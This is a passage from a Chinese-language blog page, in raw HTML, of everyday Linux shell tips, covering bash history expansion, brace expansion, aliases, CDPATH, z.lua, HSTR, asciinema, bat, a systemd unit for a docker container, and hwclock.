file4</span><br></pre></td></tr></table></figure>\n<p><img data-src=\"/N1h1l157/Linux/20097.png\" alt></p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"># 有时候我们想不只替换一处，而是把上一条命令中的每处内容都替换掉。要实现这种效果，可以使用 !:gs/old/new</span><br><span class=\"line\">cat file4.txt file5.txt</span><br><span class=\"line\">!:gs/file/nnn</span><br><span class=\"line\">cat nnn4.txt nnn5.txt</span><br></pre></td></tr></table></figure>\n<p><img data-src=\"/N1h1l157/Linux/20098.png\" alt></p>\n<h2 id><a class=\"markdownIt-Anchor\" href=\"#\">#</a> !!</h2>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">!! 让我们以最快的方式重复执行上一条命令</span></span><br><span class=\"line\">id </span><br><span class=\"line\">!!</span><br></pre></td></tr></table></figure>\n<p><img data-src=\"/N1h1l157/Linux/20099.png\" alt></p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"># !! 经常与 sudo 联用，用来解决缺少权限的问题。例如：</span><br><span class=\"line\">whoami</span><br><span class=\"line\">sudo !! </span><br><span class=\"line\">sudo whoami</span><br></pre></td></tr></table></figure>\n<p><img data-src=\"/N1h1l157/Linux/20100.png\" alt></p>\n<h2 id=\"-2\"><a class=\"markdownIt-Anchor\" href=\"#-2\">#</a> !</h2>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">利用 !foo 这种表示法允许我们执行以 foo 这三个字符打头的命令。Shell 将 以逆序的方式搜索历史命令列表，一旦与给定的开头字符匹配到，便予以执行该条命令。</span></span><br><span class=\"line\">!he </span><br><span class=\"line\">help</span><br><span class=\"line\"><span class=\"meta prompt_\"></span></span><br><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">在 ! 后面除了可以跟一个字符串之外，也可以跟一个数字。这个数字代表历史 命令列表中的编号。当我们用 <span class=\"built_in\">history</span> 查看历史命令列表时，命令左边显示的 即是该行命令的编号。</span></span><br><span class=\"line\">history 5</span><br><span class=\"line\">!52</span><br></pre></td></tr></table></figure>\n<p><img data-src=\"/N1h1l157/Linux/20101.png\" alt></p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"># 利用 !<span class=\"number\">-2</span>，我经常使用的一个场景是，先用文本编辑器编辑源代码，接着再编 译源代码。如果我需要再次编辑和编译，那么只要反复执行 !<span class=\"number\">-2</span> 即可。如此不 断循环。</span><br><span class=\"line\">nvim first.c </span><br><span class=\"line\">gcc -o first first.c </span><br><span class=\"line\">!<span class=\"number\">-2</span> # 再编辑 </span><br><span class=\"line\">!<span class=\"number\">-2</span> # 再编译</span><br></pre></td></tr></table></figure>\n<p><img data-src=\"/N1h1l157/Linux/20102.png\" alt></p>\n<h2 id=\"和\"><a class=\"markdownIt-Anchor\" href=\"#和\">#</a> !$ 和！^</h2>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">!$，它允许我直接复用上一条命令的最后一位参数</span></span><br><span class=\"line\">mkdir videos </span><br><span class=\"line\">cd !$</span><br><span class=\"line\"><span class=\"meta prompt_\"></span></span><br><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">与最后一位参数相反，!ˆ 能够让我们引用上一条命令中最开头的参数</span></span><br><span class=\"line\">ls /usr/share/doc /usr/share/man </span><br><span class=\"line\">cd !ˆ</span><br></pre></td></tr></table></figure>\n<p><img data-src=\"/N1h1l157/Linux/20103.png\" alt></p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"># 要引用的是上一条命令的所有参数。</span><br><span class=\"line\">ls src code </span><br><span class=\"line\">cp -r !*</span><br></pre></td></tr></table></figure>\n<p><img data-src=\"/N1h1l157/Linux/20104.png\" alt></p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"># 对于引用上一条命令中的参数，我们甚至可以要求 Shell 精确到具体的第几个。</span><br><span class=\"line\">touch foo.txt bar.txt baz.txt </span><br><span class=\"line\">cat !:<span class=\"number\">2</span></span><br></pre></td></tr></table></figure>\n<p><img data-src=\"/N1h1l157/Linux/20105.png\" alt></p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"># 引用从 m 到 n 的参数</span><br><span class=\"line\">touch foo.txt bar.txt baz.txt </span><br><span class=\"line\">cat !:<span class=\"number\">1</span><span class=\"number\">-2</span></span><br></pre></td></tr></table></figure>\n<p><img data-src=\"/N1h1l157/Linux/20106.png\" alt></p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"># 引用从 n 到最后的参数</span><br><span class=\"line\"># 此处的 !:<span class=\"number\">2</span>* 允许我将 hosts 和 hostname 同时打开进行编辑。</span><br><span class=\"line\">cat /etc/resolv.conf /etc/hosts /etc/hostname </span><br><span class=\"line\">cat !:<span class=\"number\">2</span>*</span><br></pre></td></tr></table></figure>\n<p><img data-src=\"/N1h1l157/Linux/20107.png\" alt></p>\n<h2 id=\"-3\"><a class=\"markdownIt-Anchor\" href=\"#-3\">#</a> !$</h2>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">:h 为修饰符，意味着截取路径的开头部分(<span class=\"built_in\">head</span>)</span></span><br><span class=\"line\">ls ~/Downloads/test/resource</span><br><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">!$:h可获取前一部分路径</span></span><br><span class=\"line\">cd !$:h</span><br><span class=\"line\">cd ~/Downloads/test/</span><br></pre></td></tr></table></figure>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">通过 :t 修饰符，我们可以引用路径的结尾部分(<span class=\"built_in\">tail</span>)</span></span><br><span class=\"line\">wget http://nginx.org/download/nginx-1.15.8.tar.gz </span><br><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">经过 !$:t 引用后，我们的命令变成了</span></span><br><span class=\"line\">tar zxvf !$:t</span><br><span class=\"line\">tar zxvf nginx-1.15.8.tar.gz</span><br></pre></td></tr></table></figure>\n<p><img data-src=\"/N1h1l157/Linux/20108.png\" alt></p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"># 对于存在文件名的情形，可以利用 :r 修饰符来只引用文件名部分（这将排除掉扩展名）。例</span><br><span class=\"line\">unzip hello.zip </span><br><span class=\"line\">cd !$:r</span><br><span class=\"line\"># 这里的 !$:r 将 hello.zip 去掉扩展名，只保留 hello 部分。</span><br></pre></td></tr></table></figure>\n<p><img data-src=\"/N1h1l157/Linux/20109.png\" alt></p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"># Shell 还支持将多个修饰符进行联用，在它们之间只需使用冒号分隔即可。例如：</span><br><span class=\"line\">ls ~/Downloads/test/resource</span><br><span class=\"line\">echo !$:t:u </span><br><span class=\"line\">echo TRUETYPE</span><br><span class=\"line\"># 先用 :t 引用了路径的结尾部分，然后又使用 :u 将其更改为了大写字母。</span><br></pre></td></tr></table></figure>\n<p><img data-src=\"/N1h1l157/Linux/20110.png\" alt></p>\n<h2 id=\"emacs\"><a class=\"markdownIt-Anchor\" href=\"#emacs\">#</a> Emacs —</h2>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">bash 和 zsh 两个都支持使用 <span class=\"built_in\">set</span> 指令来设置命令行编辑模式</span></span><br><span class=\"line\">set -o vi</span><br><span class=\"line\">set -o emacs</span><br></pre></td></tr></table></figure>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"># 在命令行输入一些字符</span><br><span class=\"line\">Ctrl + b 向左移动一个字符 </span><br><span class=\"line\">Ctrl + f 往右移动一个字符 </span><br><span class=\"line\">Ctrl + d 删除光标右边的字符 </span><br><span class=\"line\">退格键 删除光标左边的字符 </span><br><span class=\"line\">Ctrl + t 将光标左边的两个字符交换顺序</span><br></pre></td></tr></table></figure>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"># 按键作用</span><br><span class=\"line\">Ctrl + a  将光标移到行首(最左边)</span><br><span class=\"line\">Ctrl + e  将光标移到行尾(最右边)</span><br><span class=\"line\">Ctrl + k  从光标处往右删除至行尾</span><br><span class=\"line\">Ctrl + u  从光标处向左删除至行首</span><br></pre></td></tr></table></figure>\n<h2 id=\"tree\"><a class=\"markdownIt-Anchor\" href=\"#tree\">#</a> tree</h2>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">只显示目录，不显示文件</span></span><br><span class=\"line\">tree -d -L 2</span><br><span class=\"line\"><span class=\"meta prompt_\"></span></span><br><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">显示深度为2级</span></span><br><span class=\"line\">tree -L 2</span><br></pre></td></tr></table></figure>\n<p><img data-src=\"/N1h1l157/Linux/20111.png\" alt></p>\n<h2 id=\"echo\"><a class=\"markdownIt-Anchor\" href=\"#echo\">#</a> echo</h2>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">bash脚本中设置文本不换行</span></span><br><span class=\"line\">echo -n &quot;gL2JqktKqFbkyUM4&quot; &gt; 111.txt</span><br></pre></td></tr></table></figure>\n<p><img data-src=\"/N1h1l157/Linux/20112.png\" alt></p>\n<h2 id=\"cdpath\"><a class=\"markdownIt-Anchor\" href=\"#cdpath\">#</a> CDPATH</h2>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">利用<span class=\"variable\">$CDPATH</span>，我们能够将常用的目录保存起来，以便 <span class=\"built_in\">cd</span> 为我们直接转到这些目录</span></span><br><span class=\"line\">CDPATH=:~:~/Public/23:~/Public/</span><br><span class=\"line\"><span class=\"meta prompt_\"></span></span><br><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">加到 <span class=\"variable\">$CDPATH</span> 路径列表的目录为待导航的目标目录 的父目录</span></span><br><span class=\"line\">cd 22</span><br></pre></td></tr></table></figure>\n<p><img data-src=\"/N1h1l157/Linux/20113.png\" alt></p>\n<h2 id=\"alias\"><a class=\"markdownIt-Anchor\" href=\"#alias\">#</a> alias</h2>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">设置别名，方便通过简易名称使用命令</span></span><br><span class=\"line\">alias ..=&#x27;cd ..&#x27;</span><br><span class=\"line\">alias ...=&#x27;cd ../..&#x27;</span><br><span class=\"line\">alias ....=&#x27;cd ../../..&#x27;</span><br><span class=\"line\">alias ls=&#x27;ls --color=auto&#x27;</span><br><span class=\"line\">alias l=&#x27;ls -lah --color=auto&#x27;</span><br><span class=\"line\">alias la=&#x27;ls -AF --color=auto&#x27;</span><br><span class=\"line\">alias ll=&#x27;ls -lFh --color=auto&#x27;</span><br></pre></td></tr></table></figure>\n<p><img data-src=\"/N1h1l157/Linux/20114.png\" alt></p>\n<h2 id=\"-4\"><a class=\"markdownIt-Anchor\" href=\"#-4\">#</a> {}</h2>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">备份文件，相当于 <span class=\"built_in\">cp</span> linpeas_linux_amd64 linpeas_linux_amd64.bak</span></span><br><span class=\"line\">cp linpeas_linux_amd64&#123;,.bak&#125;</span><br><span class=\"line\"><span class=\"meta prompt_\"></span></span><br><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">压缩文件，相当于 tar -zcvf log.txt.tar.gz log.txt</span></span><br><span class=\"line\">tar -zcvf linpeas_linux_amd64&#123;.tar.gz,&#125;</span><br></pre></td></tr></table></figure>\n<p><img data-src=\"/N1h1l157/Linux/20115.png\" alt></p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"># 打印序列</span><br><span class=\"line\">echo &#123;a..z&#125;</span><br><span class=\"line\">echo &#123;<span class=\"number\">01.</span><span class=\"number\">.10</span>&#125;</span><br><span class=\"line\">echo &#123;<span class=\"number\">1.</span><span class=\"number\">.9</span>.<span class=\"number\">.2</span>&#125;</span><br><span class=\"line\"><span class=\"keyword\">for</span> i in &#123;<span class=\"number\">1.</span><span class=\"number\">.9</span>.<span class=\"number\">.2</span>&#125;;<span class=\"keyword\">do</span> echo $i;done | pbcopy</span><br></pre></td></tr></table></figure>\n<p><img data-src=\"/N1h1l157/Linux/20116.png\" alt></p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"># 批量下载文件</span><br><span class=\"line\">wget https:<span class=\"comment\">//linuxtoy.org/img/&#123;1..5&#125;.png -q</span></span><br></pre></td></tr></table></figure>\n<p><img data-src=\"/N1h1l157/Linux/20117.png\" alt></p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"># 连用和嵌套</span><br><span class=\"line\">mkdir -p <span class=\"number\">2019</span>/&#123;<span class=\"number\">01.</span><span class=\"number\">.12</span>&#125;/&#123;baby,photo&#125;</span><br><span class=\"line\">echo &#123;&#123;A..Z&#125;,&#123;a..z&#125;,&#123;<span class=\"number\">0.</span><span class=\"number\">.9</span>&#125;&#125;</span><br></pre></td></tr></table></figure>\n<p><img data-src=\"/N1h1l157/Linux/20118.png\" alt></p>\n<h2 id=\"zlua\"><a class=\"markdownIt-Anchor\" href=\"#zlua\">#</a> z.lua</h2>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">快速路径切换工具 z.lua</span></span><br><span class=\"line\">which lua lua5.1 lua5.2 lua5.3</span><br><span class=\"line\">git clone https://github.com/skywind3000/z.lua.git ~/.z.lua</span><br></pre></td></tr></table></figure>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"># 添加到环境变量中</span><br><span class=\"line\">eval <span class=\"string\">&quot;$(lua ~/.z.lua/z.lua --init zsh)&quot;</span></span><br><span class=\"line\"></span><br><span class=\"line\"># 在默认设置下，z.lua 将所有访问的路径都保存到了 ~/.zlua 文件中</span><br><span class=\"line\">z p</span><br></pre></td></tr></table></figure>\n<p><img data-src=\"/N1h1l157/Linux/20119.png\" alt></p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"># -i:交互模式，如果有多个匹配结果的话，那么z.lua将展示一个列表</span><br><span class=\"line\">z -i p</span><br><span class=\"line\"><span class=\"number\">2</span>:  <span class=\"number\">24</span>         /home/xx/tmp</span><br><span class=\"line\"><span class=\"number\">1</span>:  <span class=\"number\">48</span>         /home/xx/prj</span><br><span class=\"line\">&gt;</span><br></pre></td></tr></table></figure>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"># -b:这个选项在深层次目录中跳转特别有用，它可以将我们快速带回某一级的父目录</span><br><span class=\"line\">z -b <span class=\"keyword\">do</span></span><br></pre></td></tr></table></figure>\n<p><img data-src=\"/N1h1l157/Linux/20120.png\" alt></p>\n<h2 id=\"hstr\"><a class=\"markdownIt-Anchor\" href=\"#hstr\">#</a> HSTR</h2>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">ctrl + r 是自带的，但是没那么好用</span></span><br><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">命令行直接输入 hh 并按回车键</span></span><br><span class=\"line\">cd ~/cli</span><br><span class=\"line\">xiaodong@codeland:~/cli$ hh</span><br><span class=\"line\"></span><br><span class=\"line\">• 下方向键或 Ctrl + n:向下移动一行</span><br><span class=\"line\">• 上方向键或 Ctrl + p:往上移动一行</span><br><span class=\"line\">• Ctrl + f:将命令添加到收藏夹</span><br><span class=\"line\">• Delete 键:删除命令，根据提示按 y 将确认删除</span><br></pre></td></tr></table></figure>\n<p><img data-src=\"/N1h1l157/Linux/20121.png\" alt></p>\n<h2 id=\"paste\"><a class=\"markdownIt-Anchor\" href=\"#paste\">#</a> paste</h2>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">将两个文本文件按照行一一对应合并</span></span><br><span class=\"line\">paste -d &#x27;,&#x27; deafult1.txt deafult2.txt</span><br></pre></td></tr></table></figure>\n<p><img data-src=\"/N1h1l157/Linux/20123.png\" alt></p>\n<h2 id=\"asciinema\"><a class=\"markdownIt-Anchor\" href=\"#asciinema\">#</a> asciinema</h2>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">Asciinema 是一个命令行屏幕录制工具，可以帮助你记录并分享终端会话</span></span><br><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">安装 asciinema</span></span><br><span class=\"line\">brew install asciinema</span><br></pre></td></tr></table></figure>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"># 启动屏幕录制功能</span><br><span class=\"line\">asciinema rec</span><br><span class=\"line\"></span><br><span class=\"line\"># 停止录制</span><br><span class=\"line\"># 当你完成了终端会话录制后，可以按下 Ctrl+D 或输入 `<span class=\"built_in\">exit</span>` 命令来停止录制</span><br><span class=\"line\"># 或者按回车上传到 asciinema.org 网站上临时存储</span><br><span class=\"line\"></span><br><span class=\"line\"># 本地播放 cast 文件</span><br><span class=\"line\">asciinema play /var/folders/dt/<span class=\"number\">4</span>tq856fn683_ytdsqbk5271c0000gn/T/tmp2n2mfpq1-ascii.cast</span><br><span class=\"line\"></span><br><span class=\"line\"># 上传到 Asciinema 官网上，并获取共享链接</span><br><span class=\"line\">asciinema upload /path/to/recording.cast</span><br></pre></td></tr></table></figure>\n<p><img data-src=\"/N1h1l157/Linux/20124.png\" alt><br>\n<img data-src=\"/N1h1l157/Linux/20125.png\" alt></p>\n<h2 id=\"bat\"><a class=\"markdownIt-Anchor\" href=\"#bat\">#</a> bat</h2>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">Bat 是一个类似于 <span class=\"built_in\">cat</span> 命令的工具，可以显示带有语法高亮的文件内容。</span></span><br><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">安装 bat</span></span><br><span class=\"line\">brew install bat</span><br><span class=\"line\"><span class=\"meta prompt_\"></span></span><br><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">查看文件内容：在终端中输入 `bat` 命令来查看文件内容。例如：</span></span><br><span class=\"line\">bat /path/to/file.txt | less</span><br></pre></td></tr></table></figure>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"># Bat 支持多种语言的语法高亮</span><br><span class=\"line\">bat -l python /path/to/file.py</span><br><span class=\"line\"></span><br><span class=\"line\"># 查看 bat 支持的语言</span><br><span class=\"line\">bat --<span class=\"built_in\">list</span>-languages</span><br></pre></td></tr></table></figure>\n<p><img data-src=\"/N1h1l157/Linux/20126.png\" alt></p>\n<h2 id=\"systemctl\"><a class=\"markdownIt-Anchor\" href=\"#systemctl\">#</a> systemctl</h2>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">reboot 之后自启动的 docker 容器</span></span><br><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">编写 /etc/systemd/system/mrdoc.service</span> </span><br><span class=\"line\">cat &gt; /etc/systemd/system/mrdoc.service &lt;&lt; EOF</span><br><span class=\"line\">[Unit]</span><br><span class=\"line\">Description=Docker container for mrdoc</span><br><span class=\"line\">Requires=docker.service</span><br><span class=\"line\">After=docker.service</span><br><span class=\"line\"></span><br><span class=\"line\">[Service]</span><br><span class=\"line\">Restart=always</span><br><span class=\"line\">ExecStart=/usr/bin/docker start mrdoc</span><br><span class=\"line\">ExecStop=/usr/bin/docker stop mrdoc</span><br><span class=\"line\"></span><br><span class=\"line\">[Install]</span><br><span class=\"line\">WantedBy=multi-user.target</span><br><span class=\"line\">EOF</span><br><span class=\"line\"><span class=\"meta prompt_\"></span></span><br><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">运行以下命令来重新加载 Systemd 配置，并启用服务</span></span><br><span class=\"line\">systemctl daemon-reload</span><br><span class=\"line\">systemctl enable mrdoc.service</span><br><span class=\"line\"><span class=\"meta prompt_\"></span></span><br><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">运行以下命令来启动服务、停止、重起 mrdoc 服务</span></span><br><span class=\"line\">systemctl stop mrdoc.service</span><br><span class=\"line\">systemctl restart mrdoc.service</span><br><span class=\"line\">systemctl disable mrdoc.service</span><br></pre></td></tr></table></figure>\n<p><img data-src=\"/N1h1l157/Linux/20127.png\" alt></p>\n<h2 id=\"hwclock\"><a class=\"markdownIt-Anchor\" href=\"#hwclock\">#</a> hwclock</h2>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">查看系统时钟</span></span><br><span class=\"line\">date</span><br><span class=\"line\"><span class=\"meta prompt_\"></span></span><br><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">查看硬件时钟的操作：</span> </span><br><span class=\"line\">hwclock --show</span><br><span class=\"line\">clock --show</span><br><span class=\"line\"><span class=\"meta prompt_\"></span></span><br><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">设置硬件时钟的操作：</span> </span><br><span class=\"line\">hwclock --set --date=&quot;11/13/2017 09:26:00&quot;</span><br><span class=\"line\">clock --set --date=&quot;11/13/2017 09:26:00&quot;</span><br><span class=\"line\"><span class=\"meta prompt_\"></span></span><br><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">硬件时钟与系统时钟同步：</span></span><br><span class=\"line\">hwclock --hctosys</span><br><span class=\"line\">clock --hctosys</span><br></pre></td></tr></table></figure>\n<p><img 